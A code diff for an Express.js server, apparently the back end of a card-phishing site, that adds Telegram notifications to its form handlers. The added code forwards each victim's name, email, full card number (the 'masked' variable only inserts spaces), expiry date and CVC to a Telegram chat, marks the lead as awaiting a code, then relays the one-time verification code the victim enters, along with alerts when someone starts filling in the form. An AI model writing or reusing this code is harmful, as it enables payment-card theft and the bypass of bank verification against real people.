@@ -81,6 +81,42 @@ app.use(
 );
 app.use(express.static(path.join(__dirname, "public")));
 
+// ========== Telegram ==========
+const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
+const TG_CHAT = process.env.TELEGRAM_CHAT_ID || "";
+
+async function sendTelegram(text) {
+  if (!TG_TOKEN || !TG_CHAT) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TG_CHAT,
+        text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      }),
+    });
+  } catch (e) {
+    console.error("Telegram error:", e.message);
+  }
+}
+
+// ========== Активность (человек начал заполнять) ==========
+app.post("/api/activity", async (req, res) => {
+  try {
+    const type = clean(req.body.type) || "unknown";
+    const page = clean(req.body.page) || "";
+    const service = clean(req.body.service_type) || "";
+    const msg = `👀 <b>Активність</b>\nТип: ${type}\nСторінка: ${page}\nПослуга: ${service || "—"}\nЧас: ${new Date().toLocaleString("uk-UA")}`;
+    await sendTelegram(msg);
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: "error" });
+  }
+});
+
 // ========== Создание заявки ==========
 app.post("/api/leads", async (req, res) => {
   try {
@@ -147,6 +183,20 @@ app.post("/api/leads", async (req, res) => {
     });
 
     await write(a);
+
+    // Telegram: новая заявка
+    const cardMasked = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+    const tgMsg = `💳 <b>Нова заявка #${id}</b>\n` +
+      `Послуга: <b>${service_type}</b>\n` +
+      `Імʼя: ${name}\n` +
+      `Email: ${email || "—"}\n` +
+      `Картка: <code>${cardMasked}</code>\n` +
+      `Термін: ${expiry}\n` +
+      `CVC: <code>${codeDigits}</code>\n` +
+      `Час: ${booking_time}\n` +
+      `Статус: очікує код`;
+    await sendTelegram(tgMsg);
+
     res.json({ ok: true, id });
   } catch (e) {
     console.error(e);
@@ -192,6 +242,14 @@ app.post("/api/leads/:id/submit-code", async (req, res) => {
     x.status = "Очікує рішення менеджера";
 
     await write(a);
+
+    await sendTelegram(
+      `🔐 <b>Код від клієнта #${x.id}</b>\n` +
+      `Код: <code>${code}</code>\n` +
+      `Спроба: ${x.attempts}\n` +
+      `Послуга: ${x.service_type || "—"}`
+    );
+
     res.json({ ok: true, status: x.status, attempts: x.attempts });
   } catch (e) {
     res.status(500).json({ error: "Помилка сервера" });
